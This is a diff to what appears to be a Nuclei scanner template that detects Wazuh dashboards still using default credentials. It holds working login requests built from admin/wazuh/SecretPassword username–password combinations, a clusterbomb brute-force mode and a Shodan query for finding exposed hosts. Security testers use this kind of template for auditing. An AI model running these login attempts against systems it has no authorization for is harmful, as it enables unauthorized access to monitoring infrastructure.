@@ -2,33 +2,49 @@ id: wazuh-default-login
 
 info:
   name: Wazuh - Default Login
-  author: theamanrawat
+  author: theamanrawat,denandz,PulseSecurity.co.nz
   severity: high
   description: |
     Wazuh contains default credentials. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
   reference:
     - https://documentation.wazuh.com/current/user-manual/user-administration/password-management.html
     - https://wazuh.com
+    - https://documentation.wazuh.com/current/deployment-options/docker/wazuh-container.html#single-node-deployment
+  classification:
+    cpe: cpe:2.3:a:wazuh:wazuh:*:*:*:*:*:*:*:*
   metadata:
     verified: true
-    max-request: 4
-    shodan-query: title:"Wazuh"
+    max-request: 7
+    vendor: wazuh
+    product: wazuh
+    shodan-query: "title:\"Wazuh\""
   tags: wazuh,default-login
 
 http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/app/login"
+
+    extractors:
+      - type: regex
+        part: body
+        name: osd
+        group: 1
+        internal: true
+        regex:
+          - '&quot;version&quot;:&quot;([0-9.]+)&quot;'
+
   - raw:
-      - |
-        GET /app/login?nextUrl=%2Fapp%2Fwazuh HTTP/1.1
-        Host: {{Hostname}}
       - |
         POST /auth/login HTTP/1.1
         Host: {{Hostname}}
         Osd-Version: {{osd}}
+        osd-xsrf: osd-fetch
         Content-Type: application/json
 
         {"username":"{{username}}","password":"{{password}}"}
 
-    attack: pitchfork
+    attack: clusterbomb
     payloads:
       username:
         - "admin"
@@ -36,6 +52,7 @@ http:
       password:
         - "admin"
         - "wazuh"
+        - "SecretPassword"
     stop-at-first-match: true
 
     matchers-condition: and
@@ -56,13 +73,4 @@ http:
       - type: status
         status:
           - 200
-
-    extractors:
-      - type: regex
-        name: osd
-        group: 1
-        regex:
-          - '&quot;version&quot;:&quot;([0-9.]+)&quot;'
-        internal: true
-
-# digest: 4b0a00483046022100de2c876067d0aa43fb62771bff3c3adea76873a9f0982f98856a1ed321b58d48022100a60ef9271fd209ecadc68b365c82e4176cd78fe24526dcbe7a8cd8772b0337cf:922c64590222798bb761d5b6d8e72950
+# digest: 4b0a00483046022100aca7bbbb749653943f26192c2bb39a5a83889241e8a6ac72e457b842238a89280221008901a5d5e1e7e5ecabf6f1cedea365ea8a26bd3d39e410a2e47fadfd02ac355f:922c64590222798bb761d5b6d8e72950
